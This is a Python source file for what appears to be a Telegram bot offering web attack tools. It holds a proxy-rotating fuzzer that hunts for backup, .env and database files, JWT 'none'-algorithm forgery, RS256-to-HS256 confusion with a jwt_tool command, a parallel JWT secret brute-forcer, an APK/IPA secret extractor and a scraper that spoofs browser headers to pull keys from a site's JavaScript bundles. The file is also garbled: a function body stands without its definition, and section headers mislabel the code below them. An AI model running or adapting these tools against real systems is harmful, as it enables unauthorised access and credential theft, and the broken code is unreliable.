            content = meta.get('content', '') + ' ' + meta.get('name', '')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', content):
                all_words.add(w.lower())

        # Extract from JS variables / identifiers
        for script in soup.find_all('script'):
            src_text = script.string or ''
            for w in re.findall(r'(?:var|let|const|function)\s+([a-zA-Z_][a-zA-Z0-9_]{2,20})', src_text):
                all_words.add(w.lower())

        # Extract from class names and IDs
        for tag in soup.find_all(True):
            for attr in ('class', 'id', 'name'):
                vals = tag.get(attr, [])
                if isinstance(vals, str):
                    vals = [vals]
                for v in vals:
                    for w in re.split(r'[-_\s]', v):
                        if 3 <= len(w) <= 20:
                            all_words.add(w.lower())

        # Crawl 3 more internal pages
        links = list(get_internal_links(r.text, url))[:3]
        for link in links:
            try:
                r2 = requests.get(link, headers=_get_headers(), timeout=8, verify=False, proxies=proxy_manager.get_proxy())
                soup2 = BeautifulSoup(r2.text, 'html.parser')
                for tag in soup2.find_all(['h1','h2','h3','title','p']):
                    for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', tag.get_text()):
                        all_words.add(w.lower())
            except Exception:
                pass

    except Exception as e:
        if progress_cb:
            progress_cb(f"⚠️ Scrape error: {e}")

    # Add domain parts
    for part in domain_parts:
        all_words.add(part.lower())

    # Filter stop words + numeric-only
    raw_words = sorted(
        w for w in all_words
        if w not in _SMARTFUZZ_STOP_WORDS and not w.isdigit() and len(w) >= 3
    )

    if progress_cb:
        progress_cb(f"📝 Raw words: `{len(raw_words)}`")

    # ── Generate permutations ──────────────────────
    current_year = datetime.now().year
    years        = [str(y) for y in range(current_year - 3, current_year + 2)]
    suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
                     '_dev', '_test', '_staging', '_prod', '_new', '_v2',
                     '.zip', '.sql', '.tar.gz', '.env', '.json']
    prefixes      = ['', 'backup_', 'old_', 'dev_', 'test_', 'admin_', 'api_',
                     '.', '_']

    wordlist = set()

    # Base words
    for w in raw_words[:80]:   # top 80 words
        wordlist.add(w)
        wordlist.add(w + '.php')
        wordlist.add(w + '.html')
        wordlist.add(w + '.txt')
        # Year combos
        for yr in years[:3]:
            wordlist.add(f"{w}_{yr}")
            wordlist.add(f"{w}_{yr}.zip")
            wordlist.add(f"{w}_{yr}.sql")
        # Suffix combos
        for suf in suffixes[:8]:
            wordlist.add(w + suf)
        # Prefix combos
        for pfx in prefixes[:5]:
            if pfx:
                wordlist.add(pfx + w)

    # Domain-specific combos
    for part in domain_parts[:3]:
        for yr in years:
            wordlist.add(f"{part}_{yr}")
            wordlist.add(f"{part}_{yr}.zip")
            wordlist.add(f"{part}_backup_{yr}")
            wordlist.add(f"backup_{part}")
            wordlist.add(f"{part}_db.sql")
            wordlist.add(f"{part}.sql")

    final_wordlist = sorted(wordlist)
    if progress_cb:
        progress_cb(f"🎯 Wordlist: `{len(final_wordlist)}` entries generated")

    return final_wordlist, raw_words


def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
    """Probe wordlist + backup ext variants + response diff."""
    found = []

    try:
        r404 = requests.get(
            base_url.rstrip("/") + "/xyznotfound_abc123_never_exists",
            proxies=proxy_manager.get_proxy(),
            timeout=6, verify=False, headers=_get_headers()
        )
        baseline_status = r404.status_code
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_size   = len(r404.content)
        baseline_words  = len(r404.text.split()) if r404.text else 0
    except Exception:
        baseline_status, baseline_hash, baseline_size, baseline_words = 404, "", 0, 0

    # Expand wordlist with backup extensions
    expanded = list(wordlist)
    for word in wordlist[:50]:
        for ext in [".bak", ".old", ".swp", "~", ".orig"]:
            expanded.append(word.rstrip("/") + ext)

    def _probe(word):
        target = base_url.rstrip("/") + "/" + word.lstrip("/")
        try:
            r = requests.get(
                target, timeout=5, verify=False,
                headers=_get_headers(), proxies=proxy_manager.get_proxy(),
                allow_redirects=True, stream=True
            )
            chunk = b""
            for part in r.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024:
                    break
            r.close()
            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
            r_size  = len(chunk)
            r_words = len(chunk.decode("utf-8", "ignore").split())

            if r.status_code == baseline_status:
                if r_hash == baseline_hash:
                    return None
                if baseline_size > 0 and abs(r_size - baseline_size) < 30:
                    return None
                if baseline_words > 0 and abs(r_words - baseline_words) < 5:
                    return None

            if r.status_code in (200, 201, 301, 302, 401, 403, 500):
                return {
                    "url":    target,
                    "word":   word,
                    "status": r.status_code,
                    "size":   r_size,
                    "gated":  r.status_code in (401, 403),
                }
        except Exception:
            pass
        return None

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, w): w for w in expanded}
        for fut in concurrent.futures.as_completed(fmap, timeout=150):
            done += 1
            if progress_cb and done % 40 == 0:
                progress_cb(
                    f"🧪 Fuzzing: `{done}/{len(expanded)}` | "
                    f"Found: `{len(found)}` (incl. gated)"
                )
            try:
                res = fut.result(timeout=6)
                if res:
                    found.append(res)
            except Exception:
                pass

    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
    return found


# ───────────────────────────────────────────────────────────────────
# [4] REPLACE _endpoints_sync (original: line ~8865)
#     IMPROVEMENTS:
#       + Fetch /swagger.json /openapi.yaml /api-docs /redoc
#       + GraphQL introspection query (types list)
#       + Parse Next.js _buildManifest.js for route list
#       + gRPC-web content-type detection
#       + Group /v1 /v2 /v3 side-by-side in results
# ───────────────────────────────────────────────────────────────────

import base64 as _b64

_JWT_COMMON_SECRETS = [
    "secret","password","123456","admin","key","jwt","token","test",
    "changeme","mysecret","your-256-bit-secret","your-secret-key",
    "secret_key","jwt_secret","app_secret","supersecret","private",
    "qwerty","abc123","letmein","welcome","monkey","dragon","master",
    "your-secret","secretkey","jwtpassword","pass","1234","12345",
    "123456789","qwerty123","iloveyou","princess","rockyou","football",
    "!@#$%^&*","pass123","admin123","root","toor","alpine","default",
    "secret123","jwt-secret","token-secret","api-secret","app-key",
    "HS256","RS256","none","null","undefined","example",
]

def _jwt_decode_payload(token: str) -> dict:
    """Decode JWT header + payload without verification."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {"error": "Not a valid JWT (needs 3 parts separated by '.')"}
    try:
        def _b64_decode(s: str) -> dict:
            # Correct padding: -len(s) % 4 gives 0 when already aligned
            s = s.replace('-', '+').replace('_', '/')
            s += '=' * (-len(s) % 4)
            return json.loads(_b64.b64decode(s).decode('utf-8', 'replace'))
        header  = _b64_decode(parts[0])
        payload = _b64_decode(parts[1])
        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}


def _jwt_none_attack(token: str) -> dict:
    """None algorithm bypass — also try 'NONE', 'None' variants."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False, "error": dec["error"]}
        orig_alg = dec["header"].get("alg", "HS256")

        variants = []
        for alg_val in ("none", "None", "NONE", "nOnE"):
            h = {**dec["header"], "alg": alg_val}
            variants.append(f"{_b64url_encode(h)}.{parts[1]}.")

        return {
            "success":      True,
            "original_alg": orig_alg,
            "forged_tokens": variants,
            "method":       "none_alg_bypass",
            "note":         "Try all 4 case variants — some servers check case-insensitively.",
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_alg_confusion(token: str) -> dict:
    """RS256 → HS256 algorithm confusion attack."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"success": False}
    try:
        dec = _jwt_decode_payload(token)
        if "error" in dec:
            return {"success": False}
        orig_alg = dec["header"].get("alg", "HS256")
        if orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384"):
            confused = {**dec["header"], "alg": "HS256"}
            return {
                "success":         True,
                "original_alg":    orig_alg,
                "target_alg":      "HS256",
                "confused_header": _b64url_encode(confused),
                "method":          "alg_confusion",
                "note": (
                    f"{orig_alg}→HS256 confusion: Change alg to HS256 then sign with "
                    "the server's public key as the HMAC secret.\n"
                    "Tool: jwt_tool.py\n"
                    "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
                ),
            }
        return {"success": False, "note": f"Alg is `{orig_alg}` (RS/ES256 needed)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
    """Parallel HMAC brute-force — significantly faster than sequential."""
    import hmac as _hmac

    parts = token.split(".")
    if len(parts) != 3:
        return {"cracked": False, "error": "Invalid JWT"}

    target_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    header_info = _jwt_decode_payload(token).get("header", {})
    alg = header_info.get("alg", "HS256")
    if alg not in target_algs:
        return {"cracked": False, "error": f"Algorithm `{alg}` not HMAC-brute-forceable"}

    hash_fn   = target_algs[alg]
    msg_bytes = f"{parts[0]}.{parts[1]}".encode()
    sig_pad   = parts[2].replace("-", "+").replace("_", "/")
    sig_pad  += "=" * (-len(sig_pad) % 4)
    try:
        target_sig = _b64.b64decode(sig_pad)
    except Exception:
        return {"cracked": False, "error": "Cannot decode signature"}

    wl    = wordlist or _JWT_COMMON_SECRETS
    total = len(wl)
    found = [None]  # shared result

    def _try_batch(secrets):
        for secret in secrets:
            if found[0]:
                return
            try:
                computed = _hmac.new(secret.encode(), msg_bytes, hash_fn).digest()
                if computed == target_sig:
                    found[0] = secret
                    return
            except Exception:
                pass

    # Split into batches for parallel workers
    batch_size = max(1, total // 8)
    batches    = [wl[i:i + batch_size] for i in range(0, total, batch_size)]
    done_count = [0]

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_try_batch, b) for b in batches]
        for fut in concurrent.futures.as_completed(futures):
            done_count[0] += 1
            if progress_cb:
                tried = min(done_count[0] * batch_size, total)
                progress_cb(f"🔑 Brute-force: `{tried}/{total}` | Workers: 8")
            if found[0]:
                for f in futures:
                    f.cancel()
                break

    if found[0]:
        return {"cracked": True, "secret": found[0], "alg": alg,
                "tried": wl.index(found[0]) + 1}
    return {"cracked": False, "tried": total, "alg": alg}


# ───────────────────────────────────────────────────────────────────
# [3] REPLACE _fuzz_sync + _smartfuzz_probe_sync + _build_context_wordlist
#     (original: lines ~4252 / 5108 / 5231)
#     IMPROVEMENTS:
#       + Tech-aware wordlist selection (_detect_tech_stack)
#       + Backup extension scan (.bak .old .orig .swp ~)
#       + Parameter fuzzing with debug/injection values
#       + Response body diff fingerprinting (not just size/hash)
#       + 401/403 → "gated" flag distinct from "exposed"
# ───────────────────────────────────────────────────────────────────

_APP_EXTS = {
    '.apk':  'Android APK',
    '.xapk': 'Android XAPK',
    '.aab':  'Android App Bundle',
    '.ipa':  'iOS IPA',
    '.jar':  'Java JAR',
    '.war':  'Java WAR',
    '.zip':  'ZIP Archive',
    '.aar':  'Android Library',
}

# ── Regex patterns for API/URL/Key extraction ────
_APP_URL_PATTERNS = [
    # Full URLs
    re.compile(r'https?://[^\s\'"<>{}\[\]\\|^`]{8,200}'),
    # API paths
    re.compile(r'[\'"/]((?:api|rest|graphql|v\d+)/[^\s\'"<>]{3,120})[\'"/]'),
    # Base URLs
    re.compile(r'(?:BASE_URL|baseUrl|base_url|API_URL|apiUrl|HOST|ENDPOINT)\s*[=:]\s*[\'"]([^\'"]{8,150})[\'"]', re.I),
    # WebSocket
    re.compile(r'wss?://[^\s\'"<>{}\[\]\\]{8,150}'),
]

_APP_SECRET_PATTERNS = {
    'API Key':        re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
    'Secret Key':     re.compile(r'(?:secret[_-]?key|client_secret)\s*[=:]\s*[\'"]([A-Za-z0-9_\-]{16,80})[\'"]', re.I),
    'Bearer Token':   re.compile(r'[Bb]earer\s+([A-Za-z0-9\-_\.]{20,200})'),
    'AWS Key':        re.compile(r'AKIA[0-9A-Z]{16}'),
    'AWS Secret':     re.compile(r'(?:aws_secret|AWS_SECRET)[^\'"]{0,10}[\'"]([A-Za-z0-9/+=]{40})[\'"]', re.I),
    'Google API':     re.compile(r'AIza[0-9A-Za-z\-_]{35}'),
    'Firebase URL':   re.compile(r'https://[a-z0-9\-]+\.firebaseio\.com'),
    'Firebase Key':   re.compile(r'[\'"]([A-Za-z0-9_\-]{39}):APA91b[A-Za-z0-9_\-]{134}[\'"]'),
    'Stripe Key':     re.compile(r'(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}'),
    'Twilio SID':     re.compile(r'AC[0-9a-fA-F]{32}'),
    'Private Key':    re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    'JWT Token':      re.compile(r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}'),
    'MongoDB URI':    re.compile(r'mongodb(?:\+srv)?://[^\s\'"<>]{10,150}'),
    'MySQL URI':      re.compile(r'mysql://[^\s\'"<>]{10,150}'),
    'Postgres URI':   re.compile(r'postgres(?:ql)?://[^\s\'"<>]{10,150}'),
    'Hardcoded Pass': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[\'"]([^\'"]{6,60})[\'"]', re.I),
}

# ── File types to scan inside archive ───────────
_SCAN_EXTENSIONS = {
    '.smali', '.java', '.kt', '.xml', '.json', '.yaml', '.yml',
    '.properties', '.gradle', '.plist', '.js', '.ts', '.html',
    '.txt', '.cfg', '.conf', '.env', '.config', '.swift',
    '.m', '.h', '.cpp', '.py', '.rb', '.php', '.go', '.rs',
    '.dart', '.cs', '.strings', '.ini',
}

_BINARY_EXTS = {'.dex', '.so', '.dylib', '.dll', '.class'}

# Files/dirs to skip (build artifacts, noise)
_SKIP_DIRS = {
    'res/drawable', 'res/mipmap', 'res/raw', 'res/anim',
    '__MACOSX', 'META-INF', 'kotlin', 'okhttp3', 'retrofit2',
    'com/google/android', 'com/facebook', 'com/squareup',
    'io/fabric', 'com/crashlytics', 'com/amplitude',
}


def _should_skip(filepath: str) -> bool:
    fp = filepath.replace('\\', '/')
    return any(skip in fp for skip in _SKIP_DIRS)


def _scan_text_content(text: str, source_file: str) -> dict:
    """Text/source file တစ်ခုထဲမှာ URLs, APIs, secrets ရှာ"""
    urls    = set()
    secrets = {}

    for pat in _APP_URL_PATTERNS:
        for m in pat.findall(text):
            url = m.strip().rstrip('.,;\'"\\/)')
            if len(url) > 8 and not any(noise in url for noise in [
                'schemas.android', 'xmlns', 'w3.org', 'apache.org',
                'example.com', 'localhost', 'schema.org',
            ]):
                urls.add(url)

    for name, pat in _APP_SECRET_PATTERNS.items():
        matches = pat.findall(text)
        if matches:
            # Don't store full secrets — just flag existence
            secrets[name] = len(matches)

    return {"urls": list(urls), "secrets": secrets, "file": source_file}


def _extract_strings_from_binary(data: bytes) -> list:
    """Binary (DEX/SO) ထဲမှာ printable strings ရှာ"""
    strings = []
    current = []
    for byte in data:
        ch = chr(byte)
        if ch.isprintable() and byte not in (0,):
            current.append(ch)
        else:
            if len(current) >= 6:
                s = ''.join(current)
                # Only keep if looks like URL or API path
                if ('http' in s or '/api/' in s or '.com' in s
                        or '.json' in s or 'firebase' in s.lower()):
                    strings.append(s)
            current = []
    return strings[:500]  # cap


def _parse_android_manifest(xml_text: str) -> dict:
    """AndroidManifest.xml ထဲမှာ package, permissions, activities ရှာ"""
    info = {"package": "", "permissions": [], "activities": [],
            "services": [], "receivers": [], "meta_data": {}}
    try:
        # package name
        m = re.search(r'package=[\'"]([^\'"]+)[\'"]', xml_text)
        if m: info["package"] = m.group(1)

        # permissions
        for m in re.finditer(r'uses-permission[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["permissions"].append(m.group(1).replace('android.permission.', ''))

        # activities
        for m in re.finditer(r'activity[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["activities"].append(m.group(1))

        # services
        for m in re.finditer(r'service[^>]+android:name=[\'"]([^\'"]+)[\'"]', xml_text):
            info["services"].append(m.group(1))

        # meta-data (API keys often here)
        for m in re.finditer(r'meta-data[^>]+android:name=[\'"]([^\'"]+)[\'"][^>]+android:value=[\'"]([^\'"]+)[\'"]', xml_text):
            info["meta_data"][m.group(1)] = m.group(2)[:80]

    except Exception:
        pass
    return info


def _parse_ios_info_plist(plist_text: str) -> dict:
    """iOS Info.plist ထဲမှာ bundle ID, keys ရှာ"""
    info = {"bundle_id": "", "permissions": [], "url_schemes": [], "keys": {}}
    try:
        m = re.search(r'<key>CFBundleIdentifier</key>\s*<string>([^<]+)</string>', plist_text)
        if m: info["bundle_id"] = m.group(1)

        # URL Schemes
        for m in re.finditer(r'CFBundleURLSchemes.*?<string>([^<]+)</string>', plist_text, re.S):
            info["url_schemes"].append(m.group(1))

        # Privacy usage descriptions (permissions)
        for m in re.finditer(r'<key>(NS\w+UsageDescription)</key>\s*<string>([^<]{0,80})</string>', plist_text):
            info["permissions"].append(m.group(1))

        # API-related keys
        api_keys = ['GoogleService', 'Firebase', 'FacebookAppID', 'API', 'Key', 'Secret', 'Token']
        for m in re.finditer(r'<key>([^<]+)</key>\s*<string>([^<]{4,80})</string>', plist_text):
            k, v = m.group(1), m.group(2)
            if any(ak.lower() in k.lower() for ak in api_keys):
                info["keys"][k] = v[:60]

    except Exception:
        pass
    return info


def analyze_app_file(filepath: str, progress_cb=None) -> dict:
    """
    APK/IPA/ZIP/JAR ကို analyze လုပ်ပြီး:
    - API endpoints
    - Hardcoded secrets/keys
    - AndroidManifest / Info.plist info
    - Network URLs
    - Source file list
    ထုတ်ပေး
    """
    result = {
        "file_type":   "",
        "file_size_mb": 0,
        "app_info":    {},
        "urls":        [],
        "api_paths":   [],
        "secrets":     {},
        "source_files": [],
        "binary_urls": [],
        "stats":       {},
        "errors":      [],
    }

    try:
        ext      = os.path.splitext(filepath)[1].lower()
        fsize_mb = os.path.getsize(filepath) / 1024 / 1024
        result["file_type"]    = _APP_EXTS.get(ext, ext.upper())
        result["file_size_mb"] = round(fsize_mb, 2)

        if not zipfile.is_zipfile(filepath):
            result["errors"].append("Not a valid ZIP/APK/IPA file")
            return result

        all_urls    = set()
        all_secrets = {}   # {name: count}
        source_files = []

        with zipfile.ZipFile(filepath, 'r') as zf:
            names = zf.namelist()
            result["stats"]["total_files"] = len(names)
            if progress_cb:
                progress_cb(f"📂 Files: `{len(names)}`  Extracting...")

            text_count = 0
            for i, name in enumerate(names):
                if _should_skip(name):
                    continue

                _, fext = os.path.splitext(name.lower())

                # ── Text files: scan directly ──────────
                if fext in _SCAN_EXTENSIONS:
                    try:
                        data = zf.read(name)
                        text = data.decode('utf-8', errors='replace')
                        scan = _scan_text_content(text, name)

                        for url in scan["urls"]:
                            all_urls.add(url)
                        for sec_name, cnt in scan["secrets"].items():
                            all_secrets[sec_name] = all_secrets.get(sec_name, 0) + cnt

                        if scan["urls"] or scan["secrets"]:
                            source_files.append({
                                "file":    name,
                                "urls":    len(scan["urls"]),
                                "secrets": list(scan["secrets"].keys()),
                            })

                        # AndroidManifest.xml
                        if name == 'AndroidManifest.xml' and '<manifest' in text:
                            result["app_info"] = _parse_android_manifest(text)
                            result["app_info"]["platform"] = "Android"

                        # iOS Info.plist
                        if name.endswith('Info.plist') and 'CFBundle' in text:
                            result["app_info"] = _parse_ios_info_plist(text)
                            result["app_info"]["platform"] = "iOS"

                        text_count += 1
                    except Exception as e:
                        result["errors"].append(f"{name}: {e}")

                # ── Binary files: string extraction ────
                elif fext in _BINARY_EXTS and fsize_mb < 20:
                    try:
                        data = zf.read(name)
                        bin_strings = _extract_strings_from_binary(data)
                        for s in bin_strings:
                            all_urls.add(s)
                    except Exception:
                        pass

                if progress_cb and (i + 1) % 50 == 0:
                    progress_cb(
                        f"🔍 Scanning `{i+1}/{len(names)}`\n"
                        f"🌐 URLs: `{len(all_urls)}` | 🔑 Secrets: `{len(all_secrets)}`"
                    )

        # ── Categorize URLs ───────────────────────────
        api_paths = set()
        full_urls = set()
        ws_urls   = set()

        for u in all_urls:
            u = u.strip().rstrip('/.,;')
            if not u: continue
            if u.startswith('wss://') or u.startswith('ws://'):
                ws_urls.add(u)
            elif u.startswith('http'):
                full_urls.add(u)
                # Extract path as API path too
                try:
                    p = urlparse(u).path
                    if p and len(p) > 3 and any(k in p for k in [
                        '/api/', '/rest/', '/v1/', '/v2/', '/graphql', '/auth', '/user'
                    ]):
                        api_paths.add(p)
                except Exception:
                    pass
            elif u.startswith('/'):
                api_paths.add(u)

        result["urls"]         = sorted(full_urls)[:300]
        result["api_paths"]    = sorted(api_paths)[:200]
        result["ws_urls"]      = sorted(ws_urls)[:50]
        result["secrets"]      = all_secrets
        result["source_files"] = sorted(source_files,
                                         key=lambda x: x["urls"] + len(x["secrets"]) * 3,
                                         reverse=True)[:30]
        result["stats"].update({
            "text_files_scanned": text_count,
            "unique_urls":        len(full_urls),
            "api_paths":          len(api_paths),
            "ws_urls":            len(ws_urls),
            "secret_types":       len(all_secrets),
        })

    except Exception as e:
        result["errors"].append(str(e))

    return result



# ── Admin callbacks ───────────────────────────────

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("🚫 Admin only", show_alert=True); return
    if update.effective_chat.type != "private":
        await query.answer("Private chat only", show_alert=True); return

    async with db_lock:
        db = _load_db_sync()
    data = query.data

    if data == "adm_users":
        lines = ["👥 *Users*\n"]
        for uid, u in list(db["users"].items())[:20]:
            icon = "🚫" if u["banned"] else "✅"
            lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        try: await query.edit_message_text("\n".join(lines) or "Empty", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        except BadRequest: pass

    elif data == "adm_stats":
        today   = str(date.today())
        tdl     = sum(u.get("total_downloads",0) for u in db["users"].values())
        tdl_day = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
        top = sorted(db["users"].items(), key=lambda x: x[1].get("total_downloads",0), reverse=True)[:5]
        top_txt = "\n".join(f"  {i+1}. {u['name']} ({u['total_downloads']})" for i,(_,u) in enumerate(top)) or "None"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            f"📊 *Stats*\n\nTotal: `{tdl}` | Today: `{tdl_day}`\n\n🏆 Top:\n{top_txt}",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_settings":
        s  = db["settings"]
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            f"⚙️ *Settings*\n\n"
            f"Daily Limit: `{s['global_daily_limit']}` (`/setlimit global <n>`)\n"
            f"Max Pages: `{s['max_pages']}` (`/setpages <n>`)\n"
            f"Max Assets: `{s['max_assets']}` (`/setassets <n>`)\n"
            f"Bot: `{'ON' if s['bot_enabled'] else 'OFF'}`\n"
            f"Rate Limit: `{RATE_LIMIT_SEC}s` per request\n"
            f"Max Asset Size: `{MAX_ASSET_MB}MB`\n"
            f"Split: `{SPLIT_MB}MB`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_toggle_bot":
        async with db_lock:
            db2 = _load_db_sync()
            db2["settings"]["bot_enabled"] = not db2["settings"]["bot_enabled"]
            _save_db_sync(db2)
            new_state = db2["settings"]["bot_enabled"]
        await query.answer(f"Bot is now {'🟢 ON' if new_state else '🔴 OFF'}", show_alert=True)
        async with db_lock:
            db3 = _load_db_sync()
        await _send_admin_panel(query, db3)

    elif data == "adm_log":
        all_logs = []
        for uid, u in db["users"].items():
            for d in u.get("downloads",[]): all_logs.append((u["name"], d))
        all_logs.sort(key=lambda x: x[1]["time"], reverse=True)
        lines = ["📜 *Recent 15*\n"]
        for name, d in all_logs[:15]:
            icon = "✅" if d["status"]=="success" else "❌"
            lines.append(f"{icon} *{name}* `{d['url'][:35]}` {d['time']}")
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            "\n".join(lines) if len(lines)>1 else "Empty",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_back":
        await _send_admin_panel(query, db)



# ══════════════════════════════════════════════════
# 🔑  KEYDUMP ENGINE v18 — Flagship Key Extractor
# ══════════════════════════════════════════════════


import base64 as _b64
import math


# ─── Deep Scraper: HTML + JS bundles (used by keydump & key commands) ────────

def _scrape_full(url: str, max_js: int = 15) -> dict:
    """
    Fetch target page + all linked JS bundles aggressively.
    Handles: lazy-loaded scripts, webpack chunks, CDN-hosted JS,
             inline scripts, meta-refresh redirects.
    Returns: {html, headers, status, cookies, js_sources, all_text}
    """
    result = {
        "html": "", "headers": {}, "status": 0,
        "cookies": {}, "js_sources": [], "all_text": ""
    }

    # Browser-like headers to avoid bot blocks
    browser_headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/123.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                  "image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        sess = requests.Session()
        sess.headers.update(browser_headers)
        proxy = proxy_manager.get_proxy()

        resp = sess.get(
            url, timeout=20, verify=False,
            allow_redirects=True, proxies=proxy
        )
        result["html"]    = resp.text
        result["headers"] = dict(resp.headers)
        result["status"]  = resp.status_code
        result["cookies"] = {c.name: c.value for c in sess.cookies}

        html_text = resp.text
        base_url  = url

        # ── Collect JS URLs ──────────────────────────────────────
        js_urls = []
        seen    = set()

        def _add_js(raw_url):
            if not raw_url:
                return
            # Skip data URIs and obvious non-JS
            if raw_url.startswith("data:"):
                return
            full = urljoin(base_url, raw_url)
            # Normalise — drop query for dedup key
            key = full.split("?")[0]
            if key in seen:
                return
            if not full.startswith("http"):
                return
            # Only JS / no-extension paths (could be bundled JS)
            ext = key.rsplit(".", 1)[-1].lower() if "." in key.split("/")[-1] else ""
            if ext in ("css", "png", "jpg", "jpeg", "gif", "svg", "ico",
                       "woff", "woff2", "ttf", "eot", "map", "json"):
                return
            seen.add(key)
            js_urls.append(full)

        # 1. BeautifulSoup: <script src=...>
        try:
            soup = BeautifulSoup(html_text, "html.parser")
            for tag in soup.find_all("script", src=True):
                _add_js(tag.get("src", ""))
        except Exception:
            pass

        # 2. Regex: all quoted .js URLs (catches lazy-loaded / dynamic imports)
        for m in re.finditer(
            r'''["'`]((https?:)?//[^"'`\s<>]+?\.js(?:\?[^"'`\s<>]*)?)["'`]''',
            html_text
        ):
            _add_js(m.group(1))

        # 3. Regex: relative /static /assets /_next /js paths
        for _js_m in re.finditer(
            r'(?<=["\' ])(/(?:static|assets|js|_next|dist|build|chunks|bundles|public|_nuxt)[a-zA-Z0-9_./?=&%-]*\.js)',
            html_text
        ):
            _add_js(_js_m.group(1))

        # 4. Next.js / webpack chunk manifest patterns
        for m in re.finditer(
            r'"([^"]+\.js)":\s*(?:"[^"]*"|[0-9]+)',
            html_text
        ):
            candidate = m.group(1)
            if "/" in candidate and len(candidate) < 200:
                _add_js(candidate)

        # 5. importmap entries
        for m in re.finditer(
            r'"imports"\s*:\s*\{([^}]+)\}',
            html_text
        ):
            for url_m in re.finditer(r'"([^"]+\.js[^"]*)"', m.group(1)):
                _add_js(url_m.group(1))

        # ── Fetch JS concurrently ────────────────────────────────
        js_headers = {
            "User-Agent": browser_headers["User-Agent"],
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": url,
            "Sec-Fetch-Dest": "script",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "cross-site",
        }

        def _fetch_js(js_url: str):
            try:
                r = sess.get(
                    js_url, timeout=12, verify=False,
                    allow_redirects=True, proxies=proxy,
                    headers=js_headers
                )
                if r.status_code == 200:
                    ct = r.headers.get("Content-Type", "")
                    # Accept JS and also text/plain (some CDNs serve it wrong)
                    if any(x in ct for x in ("javascript", "text/plain", "application/")) \
                            or js_url.endswith(".js"):
                        text = r.text
                        if len(text) > 10:   # Skip empty/1-line files
                            return (js_url, text[:3_000_000])  # cap 3MB
            except Exception:
                pass
            return None

        limit = min(max_js, len(js_urls))
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            futs = [ex.submit(_fetch_js, u) for u in js_urls[:limit]]
            for fut in concurrent.futures.as_completed(futs, timeout=30):
                try:
                    res = fut.result(timeout=12)
                    if res:
                        result["js_sources"].append(res)
                except Exception:
                    pass

    except Exception as e:
        logger.debug("_scrape_full error: %s", e)

    # ── Combine all text ─────────────────────────────────────────
    parts = [result["html"]] + [js for _, js in result["js_sources"]]
    result["all_text"] = "\n".join(parts)
    return result


    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    ln = len(s)
    return -sum((f/ln) * math.log2(f/ln) for f in freq.values())

# ─── Master pattern registry (TruffleHog/Gitleaks style) ──────
_KD_PATTERNS = {
    # Cloud / Infra
    "AWS Access Key ID": (r"(AKIA[0-9A-Z]{16})", "☁️"),
    "AWS Secret Access Key": (r"(?:aws_secret_access_key|AWS_SECRET).{0,20}([A-Za-z0-9+/]{40})", "☁️"),
